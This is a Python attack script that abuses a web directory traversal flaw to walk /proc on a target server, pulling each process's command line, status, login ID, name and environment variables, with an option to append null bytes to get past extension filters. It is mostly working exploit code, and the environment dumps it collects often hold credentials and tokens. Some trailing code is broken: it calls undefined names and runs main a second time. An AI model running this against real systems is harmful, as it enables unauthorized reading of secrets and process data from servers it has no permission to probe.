#!/usr/bin/env python3

# Extracts useful information about a system based on /proc, including ps listing.



import requests,argparse,sys,os
from pathlib import Path


def createDir(directory):
	newdir=Path(os.getcwd(),directory)  
	vprint(f"Creating {newdir}")

	try:
		os.makedirs(newdir,0o775,True)
	except FileExistsError:
		print(f"{newdir} already exists.")
		pass
	except OSError as e:
		raise e
	finally:
		return newdir



def writeFile(filename,content,directory):

	# First crunch the path/filename from target to a flat file name
	tmpfile=filename

	# Handle Unix paths
	# If unix path starts with leading /, delete it
	if tmpfile.startswith('/'):
		tmpfile=tmpfile.replace('/','',1)

	# replace the others with an underscore
	tmpfile=tmpfile.replace('/','_')
	
	# handle Windows paths
	tmpfile=tmpfile.replace(':','')
	tmpfile=tmpfile.replace('\\','_')

	# Build the full file path
	d=Path(directory)
	f=d/tmpfile

	# Then open the file and write it.
	f=str(f).rstrip()

	if len(content)>0:
		print(f"Writing file {f}")
		try:
			fh = open(f,"w")
			fh.write(content)
			fh.close()
		except OSError as e:
			raise



		

def parseArgs(argv):
	parser = argparse.ArgumentParser( 
	                                description = "Brute forces /proc when you have Directory Traversal")

	parser.add_argument(
	                      "url",
	                      help = "Full path to directory traversal vulnerability.  Don't include a final slash. e.g http://hostname/path?arg=../../../")

#	parser.add_argument(
#						  "traversal_string",
#						  help="The string required to reach the root directory, e.g. ../../../..")

	parser.add_argument(
	                      "-p",
	                      "--port",
	                      default=80,
	                      help="Specify port",
	                      action="store")

	parser.add_argument(
	                      "-P",
	                      "--max_pid",
	                      default=30000,
	                      help="Specify maximum pid to iterate to",
	                      action="store")


	parser.add_argument(
	                      "-H",
	                      "--header",
	                      help="add a custom header",
	                      type=str,
	                      action="store"
	                      )

	parser.add_argument(
	                      "-v",
	                      "--verbose",
	                      help="increase output verbosity",
	                      action="store_true")
	parser.add_argument(
	                      "-d",
	                      "--debug",
	                      help="debug output",
	                      action="store_true")

	parser.add_argument(
						  "-o",
						  "--outdir",
						  help="Specify a directory relative to the current directory to save files.\n Directory will be created if necessary. Filenames will be flattened in here")
	
	parser.add_argument(
						  "-n",
						  "--nullbyte",
						  help="Appends a null byte (0x00) to each request. This may allow requests to web apps that automatically append a file extension.",
						  action="store_true")
	return parser.parse_args()	



def main():
	args = parseArgs(sys.argv)

	global debug
	global verbose
	debug = args.debug
	verbose=args.verbose

	# Define a verbose printing mechanism
	global vprint
	vprint = print if args.verbose else lambda *a, **k: None

	#define a seperate debug print
	global dprint
	dprint = print if args.debug else lambda *a, **k: None


	infoToGet=["cmdline","status","loginuid","comm","environ"]
	max_pid=args.max_pid
	url=args.url
	outdir=args.outdir

	sess=requests.Session()


	headerlist=args.header.split(":",maxsplit=1)
	headers={headerlist[0].lstrip():headerlist[1].lstrip()}
	vprint(headers)

	sess.headers.update(headers)

	# Create Output Directory if required
	if outdir!=None:
		print(f"Output directory: {outdir}")
		fulldir=createDir(outdir)
	else:
		fulldir=None


	proc_url=f"{url}/proc"

	for pid in range (max_pid):
		dprint(f"PID: {pid}")
		reachable=True
		pid_url=f"{proc_url}/{pid}"

		procinfo=dict.fromkeys(infoToGet)


		for key in procinfo:
			response=None
			req_url=f"{pid_url}/{key}"

			dprint(req_url)
			response = sess.get(req_url)

			if response.status_code==404:
				reachable=False
				break

			if response.status_code>300 and response.status_code <=399:
				vprint(f"WARNING: Redirected to {response.headers['location']}")


			if (response.status_code==200) or ( response.status_code>300 and response.status_code <=399 ):
				if len(response.text)!=0: 
					procinfo[key] = response.text   # was .content
					print(f"/proc/{pid}/{key}")
					print (procinfo[key])
					if fulldir!=None:
						#writeFile("{}-{}".format(pid,key),response.text,fulldir)
						writeFile(f"{pid}-{key}",response.text,fulldir)

					print("----------------------------------------------------------")
			else:
				vprint(f"{response.status_code} Error requesting {req_url}")
				vprint("----------------------------------------------------------")
		if not reachable:
			dprint(f"{pid} not reachable. Skipping...")
			continue



if __name__== '__main__':
	try:
		main()
	except KeyboardInterrupt or OSError:
			print("ctrl-c detected. quitting")
			exit(1)






	if len(sys.argv)==1:
		parser.print_help()
		sys.exit()







main(args)

